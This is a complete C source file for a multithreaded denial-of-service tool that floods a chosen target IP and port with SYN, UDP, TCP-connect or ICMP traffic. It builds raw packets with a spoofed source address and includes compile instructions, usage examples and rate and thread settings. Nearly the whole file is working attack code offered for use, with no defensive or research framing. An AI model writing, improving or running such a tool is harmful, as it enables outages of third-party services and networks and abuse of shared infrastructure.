/*
 * High-Performance DDoS Tool
 * Optimized C implementation for maximum packet generation
 * 
 * Compilation:
 * gcc -o ddos_tool ddos_tool.c -lpthread
 * 
 * Usage:
 * ./ddos_tool <target_ip> <target_port> <attack_type> <duration> <threads> <rate>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define MAX_THREADS 500
#define MAX_PACKET_SIZE 65535
#define DEFAULT_PACKET_SIZE 1024

// Global variables
volatile int running = 1;
int packets_sent = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// Attack configuration
typedef struct {
    char target_ip[16];
    int target_port;
    int attack_type;
    int duration;
    int thread_count;
    int packet_rate;
    int packet_size;
} attack_config_t;

// Thread data
typedef struct {
    attack_config_t *config;
    int thread_id;
    int packets_sent;
} thread_data_t;

// Attack types
enum attack_types {
    ATTACK_SYN_FLOOD = 1,
    ATTACK_UDP_FLOOD = 2,
    ATTACK_TCP_FLOOD = 3,
    ATTACK_ICMP_FLOOD = 4
};

// Function prototypes
void *syn_flood_thread(void *arg);
void *udp_flood_thread(void *arg);
void *tcp_flood_thread(void *arg);
void *icmp_flood_thread(void *arg);
void signal_handler(int sig);
void print_usage(char *program);
void print_stats();
unsigned short checksum(void *b, int len);

// Signal handler for graceful shutdown
void signal_handler(int sig) {
    printf("\n[!] Received signal %d, stopping attack...\n", sig);
    running = 0;
}

// Calculate IP checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    // Sum all 16-bit words
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    // Add odd byte if present
    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    // Add carry
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    result = ~sum;
    return result;
}

// SYN Flood attack thread
void *syn_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int sockfd;
    struct sockaddr_in target;
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    char packet[MAX_PACKET_SIZE];
    int one = 1;
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        printf("[-] Thread %d: Failed to create raw socket: %s\n", 
               data->thread_id, strerror(errno));
        return NULL;
    }
    
    // Set socket options
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[-] Thread %d: Failed to set socket options\n", data->thread_id);
        close(sockfd);
        return NULL;
    }
    
    // Setup target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(config->target_port);
    target.sin_addr.s_addr = inet_addr(config->target_ip);
    
    // Prepare packet headers
    memset(packet, 0, sizeof(packet));
    ip_header = (struct iphdr *)packet;
    tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
    
    // Fill IP header
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip_header->id = htons(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr("192.168.1.100"); // Spoofed source
    ip_header->daddr = target.sin_addr.s_addr;
    
    // Fill TCP header
    tcp_header->source = htons(rand() % 65535);
    tcp_header->dest = htons(config->target_port);
    tcp_header->seq = rand();
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->syn = 1;
    tcp_header->window = htons(65535);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;
    
    printf("[+] Thread %d: SYN flood started\n", data->thread_id);
    
    // Attack loop
    while (running) {
        // Randomize source port and sequence number
        tcp_header->source = htons(rand() % 65535);
        tcp_header->seq = rand();
        
        // Calculate checksums
        ip_header->check = 0;
        ip_header->check = checksum(ip_header, sizeof(struct iphdr));
        
        tcp_header->check = 0;
        // Note: Simplified checksum calculation
        
        // Send packet
        if (sendto(sockfd, packet, ip_header->tot_len, 0, 
                   (struct sockaddr *)&target, sizeof(target)) > 0) {
            data->packets_sent++;
            
            pthread_mutex_lock(&stats_mutex);
            packets_sent++;
            pthread_mutex_unlock(&stats_mutex);
        }
        
        // Rate limiting
        if (config->packet_rate > 0) {
            usleep(1000000 / config->packet_rate);
        }
    }
    
    close(sockfd);
    printf("[+] Thread %d: SYN flood stopped, sent %d packets\n", 
           data->thread_id, data->packets_sent);
    
    return NULL;
}

// UDP Flood attack thread
void *udp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int sockfd;
    struct sockaddr_in target;
    char *payload;
    
    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printf("[-] Thread %d: Failed to create UDP socket\n", data->thread_id);
        return NULL;
    }
    
    // Setup target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(config->target_port);
    target.sin_addr.s_addr = inet_addr(config->target_ip);
    
    // Prepare payload
    payload = malloc(config->packet_size);
    memset(payload, 'A', config->packet_size);
    
    printf("[+] Thread %d: UDP flood started\n", data->thread_id);
    
    // Attack loop
    while (running) {
        if (sendto(sockfd, payload, config->packet_size, 0,
                   (struct sockaddr *)&target, sizeof(target)) > 0) {
            data->packets_sent++;
            
            pthread_mutex_lock(&stats_mutex);
            packets_sent++;
            pthread_mutex_unlock(&stats_mutex);
        }
        
        // Rate limiting
        if (config->packet_rate > 0) {
            usleep(1000000 / config->packet_rate);
        }
    }
    
    free(payload);
    close(sockfd);
    printf("[+] Thread %d: UDP flood stopped, sent %d packets\n", 
           data->thread_id, data->packets_sent);
    
    return NULL;
}

// TCP Flood attack thread
void *tcp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int sockfd;
    struct sockaddr_in target;
    
    printf("[+] Thread %d: TCP flood started\n", data->thread_id);
    
    // Attack loop
    while (running) {
        // Create new socket for each connection attempt
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            continue;
        }
        
        // Setup target address
        memset(&target, 0, sizeof(target));
        target.sin_family = AF_INET;
        target.sin_port = htons(config->target_port);
        target.sin_addr.s_addr = inet_addr(config->target_ip);
        
        // Attempt connection (non-blocking would be better)
        connect(sockfd, (struct sockaddr *)&target, sizeof(target));
        
        data->packets_sent++;
        pthread_mutex_lock(&stats_mutex);
        packets_sent++;
        pthread_mutex_unlock(&stats_mutex);
        
        close(sockfd);
        
        // Rate limiting
        if (config->packet_rate > 0) {
            usleep(1000000 / config->packet_rate);
        }
    }
    
    printf("[+] Thread %d: TCP flood stopped, sent %d packets\n", 
           data->thread_id, data->packets_sent);
      return NULL;
}

// ICMP Flood attack thread (Ping flood)
void *icmp_flood_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    attack_config_t *config = data->config;
    
    int sockfd;
    struct sockaddr_in target;
    struct iphdr *ip_header;
    struct icmphdr {
        uint8_t type;
        uint8_t code;
        uint16_t checksum;
        uint16_t id;
        uint16_t sequence;
    } *icmp_header;
    char packet[MAX_PACKET_SIZE];
    int one = 1;
    
    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sockfd < 0) {
        printf("[-] Thread %d: Failed to create raw socket: %s\n", 
               data->thread_id, strerror(errno));
        return NULL;
    }
    
    // Set socket options
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        printf("[-] Thread %d: Failed to set socket options\n", data->thread_id);
        close(sockfd);
        return NULL;
    }
    
    // Setup target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(config->target_ip);
    
    // Prepare packet headers
    memset(packet, 0, sizeof(packet));
    ip_header = (struct iphdr *)packet;
    icmp_header = (struct icmphdr *)(packet + sizeof(struct iphdr));
    
    // Fill IP header
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    ip_header->id = htons(rand());
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_ICMP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr("192.168.1.100"); // Spoofed source
    ip_header->daddr = target.sin_addr.s_addr;
    
    // Fill ICMP header (echo request)
    icmp_header->type = 8;  // Echo request
    icmp_header->code = 0;
    icmp_header->checksum = 0;
    icmp_header->id = htons(rand());
    icmp_header->sequence = htons(1);
    
    printf("[+] Thread %d: ICMP flood started\n", data->thread_id);
    
    // Attack loop
    while (running) {
        // Randomize ID
        ip_header->id = htons(rand());
        icmp_header->id = htons(rand());
        icmp_header->sequence = htons(rand() % 65535);
        
        // Calculate checksums
        ip_header->check = 0;
        ip_header->check = checksum(ip_header, sizeof(struct iphdr));
        
        icmp_header->checksum = 0;
        icmp_header->checksum = checksum(icmp_header, sizeof(struct icmphdr));
        
        // Send packet
        if (sendto(sockfd, packet, ip_header->tot_len, 0, 
                   (struct sockaddr *)&target, sizeof(target)) > 0) {
            data->packets_sent++;
            
            pthread_mutex_lock(&stats_mutex);
            packets_sent++;
            pthread_mutex_unlock(&stats_mutex);
        }
        
        // Rate limiting
        if (config->packet_rate > 0) {
            usleep(1000000 / config->packet_rate);
        }
    }
    
    close(sockfd);
    printf("[+] Thread %d: ICMP flood stopped, sent %d packets\n", 
           data->thread_id, data->packets_sent);
    
    return NULL;
}

// Print statistics
void print_stats() {
    static time_t last_time = 0;
    static int last_packets = 0;
    time_t current_time = time(NULL);
    
    if (current_time - last_time >= 5) {  // Print every 5 seconds
        pthread_mutex_lock(&stats_mutex);
        int current_packets = packets_sent;
        pthread_mutex_unlock(&stats_mutex);
        
        int pps = (current_packets - last_packets) / (current_time - last_time);
        
        printf("[*] Packets sent: %d (Rate: %d pps)\n", current_packets, pps);
        
        last_time = current_time;
        last_packets = current_packets;
    }
}

// Print usage information
void print_usage(char *program) {    printf("High-Performance DDoS Tool\n");
    printf("Usage: %s <target_ip> <target_port> <attack_type> <duration> <threads> <rate>\n\n", program);
    printf("Parameters:\n");
    printf("  target_ip    - Target IP address\n");
    printf("  target_port  - Target port number\n");
    printf("  attack_type  - Attack type (1=SYN, 2=UDP, 3=TCP, 4=ICMP)\n");
    printf("  duration     - Attack duration in seconds\n");
    printf("  threads      - Number of threads (1-%d)\n", MAX_THREADS);
    printf("  rate         - Packets per second per thread (0=unlimited)\n\n");    printf("Examples:\n");
    printf("  %s 192.168.1.100 80 1 60 50 1000    # SYN flood\n", program);
    printf("  %s 192.168.1.100 53 2 30 20 500     # UDP flood\n", program);
    printf("  %s 192.168.1.100 22 3 45 10 100     # TCP flood\n", program);
    printf("  %s 192.168.1.100 0 4 60 30 200      # ICMP flood\n", program);
    printf("\nNote: Some attacks require root privileges for raw sockets.\n");
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        print_usage(argv[0]);
        return 1;
    }
    
    // Parse command line arguments
    attack_config_t config;
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]);
    config.attack_type = atoi(argv[3]);
    config.duration = atoi(argv[4]);
    config.thread_count = atoi(argv[5]);
    config.packet_rate = atoi(argv[6]);
    config.packet_size = DEFAULT_PACKET_SIZE;
      // Validate parameters
    if (config.target_port <= 0 || config.target_port > 65535) {
        printf("[-] Invalid port number\n");
        return 1;
    }
    
    if (config.attack_type < 1 || config.attack_type > 4) {
        printf("[-] Invalid attack type\n");
        return 1;
    }
    
    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
        printf("[-] Invalid thread count (1-%d)\n", MAX_THREADS);
        return 1;
    }
    
    // Setup signal handlers
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Seed random number generator
    srand(time(NULL));
      printf("=== High-Performance DDoS Tool ===\n");
    printf("Target: %s:%d\n", config.target_ip, config.target_port);
    printf("Attack Type: %s\n", 
           config.attack_type == 1 ? "SYN Flood" :
           config.attack_type == 2 ? "UDP Flood" : 
           config.attack_type == 3 ? "TCP Flood" : "ICMP Flood");
    printf("Duration: %d seconds\n", config.duration);
    printf("Threads: %d\n", config.thread_count);
    printf("Rate: %d pps per thread\n", config.packet_rate);
    printf("==================================\n\n");
    
    // Create threads
    pthread_t threads[MAX_THREADS];
    thread_data_t thread_data[MAX_THREADS];
    
    void *(*attack_function)(void *);
      switch (config.attack_type) {
        case ATTACK_SYN_FLOOD:
            attack_function = syn_flood_thread;
            break;
        case ATTACK_UDP_FLOOD:
            attack_function = udp_flood_thread;
            break;
        case ATTACK_TCP_FLOOD:
            attack_function = tcp_flood_thread;
            break;
        case ATTACK_ICMP_FLOOD:
            attack_function = icmp_flood_thread;
            break;
        default:
            printf("[-] Unknown attack type\n");
            return 1;
    }
    
    printf("[+] Starting %d attack threads...\n", config.thread_count);
    
    // Launch attack threads
    for (int i = 0; i < config.thread_count; i++) {
        thread_data[i].config = &config;
        thread_data[i].thread_id = i + 1;
        thread_data[i].packets_sent = 0;
        
        if (pthread_create(&threads[i], NULL, attack_function, &thread_data[i]) != 0) {
            printf("[-] Failed to create thread %d\n", i + 1);
        }
    }
    
    // Attack duration timer
    time_t start_time = time(NULL);
    time_t end_time = start_time + config.duration;
    
    printf("[+] Attack started at %s", ctime(&start_time));
    
    // Statistics loop
    while (running && time(NULL) < end_time) {
        print_stats();
        sleep(1);
    }
    
    // Stop attack
    running = 0;
    
    printf("\n[!] Stopping attack...\n");
    
    // Wait for all threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Final statistics
    time_t total_time = time(NULL) - start_time;
    printf("\n=== Attack Completed ===\n");
    printf("Duration: %ld seconds\n", total_time);
    printf("Total packets sent: %d\n", packets_sent);
    printf("Average rate: %.2f pps\n", (float)packets_sent / total_time);
    printf("========================\n");
    
    return 0;
}
